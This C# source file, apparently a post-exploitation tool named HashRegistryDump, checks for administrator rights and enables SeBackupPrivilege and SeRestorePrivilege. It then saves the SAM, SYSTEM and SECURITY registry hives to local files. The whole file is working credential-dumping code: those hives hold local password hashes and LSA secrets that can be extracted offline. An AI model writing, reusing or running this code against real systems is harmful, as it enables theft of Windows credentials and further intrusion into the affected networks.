using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;
using System.IO;

namespace HashRegistryDump
{
    class CheckPrivilege
    {
        public static bool EnableDisablePrivilege(string PrivilegeName,bool EnableDisable)
        {
            var Htok = IntPtr.Zero;
            if (!Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, (int)(TokenAccessLevels.AdjustPrivileges | TokenAccessLevels.Query), out Htok))
            {
                Console.WriteLine("[-] Not OpenCurrentProcess");
                return false;
            }
            // 初始化并设置值
            
            Win32.LUID luid;
            if (!Win32.LookupPrivilegeValue(null, PrivilegeName, out luid))
            {
                Console.WriteLine("[-] Not LookupPrivilegeValue");
                return false;
            }
            Win32.LUID_AND_ATTRIBUTES LuidAndAttributes = new Win32.LUID_AND_ATTRIBUTES { Luid = luid,Attributes = (uint)(EnableDisable ? 2 : 0) }; 
            Win32.LUID_AND_ATTRIBUTES[] privileges = {LuidAndAttributes};
            var tokenPrivilege = new Win32.TOKEN_PRIVILEGES {
                PrivilegeCount = 1,
                Privileges = privileges,
            };
            var privilege = new Win32.TOKEN_PRIVILEGES();
            uint rb;
            if (!Win32.AdjustTokenPrivileges(Htok,false,ref tokenPrivilege,256,out privilege,out rb))
            {
                Console.WriteLine("[-] Not AdjustTokenPrivilege");
                return false;
            }
            return true;
        }

        public static bool IsHighPrivilege()
        {
            // 获取当前进程
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
    class HashRegistry
    {
        public static bool ExportRegistryByKey(string Key, string filename)
        {
            var HkeyHandle = new UIntPtr();
            uint HKEY_LOCAL_MACHINE = 0x80000002;
            //UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
            try
            {
               // 打开注册表
                if (Win32.RegOpenKeyEx((UIntPtr)HKEY_LOCAL_MACHINE, Key, 0x0004 | 0x0008 ,0xF003F, out HkeyHandle) != 0)
                {
                    Console.WriteLine("[-] Open Regiistry Key Failed");
                    return false;
                }
                Win32.RegSaveKey(HkeyHandle,filename,IntPtr.Zero);
                Win32.RegCloseKey(HkeyHandle);
                Console.WriteLine("Exported HKLM\\{0} at {1}", Key, filename);
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message.ToString());
                return false;
            }
            return true;
        }

        public static void DumpAndSaveRegistry()
        {
            try
            {
                if (!CheckPrivilege.EnableDisablePrivilege("SeBackupPrivilege", true))
                {
                    Console.WriteLine("Set SeBackupPrivilege Failed");
                    return;
                }
                if (!CheckPrivilege.EnableDisablePrivilege("SeRestorePrivilege", true))
                {
                    Console.WriteLine("Set SeRestorePrivilege Failed");
                    return;
                }
                if (!ExportRegistryByKey("SAM", Path.Combine("sam.hiv"))){
                    Console.WriteLine("Export SAM Fialed");
                    return;
                }
                if (!ExportRegistryByKey("SYSTEM", Path.Combine("system.hiv"))){
                    Console.WriteLine("Export SYSTEM Fialed");
                    return;
                }
                if (!ExportRegistryByKey("SECURITY", Path.Combine("security.hiv")))
                {
                    Console.WriteLine("Export SECURITY Fialed");
                    return;
                }
             }catch(Exception e)
            {
                Console.WriteLine(e.Message.ToString());
            }
        }

        static void Main(string[] args)
        {
            if (!CheckPrivilege.IsHighPrivilege())
            {
                Console.WriteLine("[-] Not running in high integrity process");
                return;
            }
            else
            {
                DumpAndSaveRegistry();
            } 
        }
    }
}
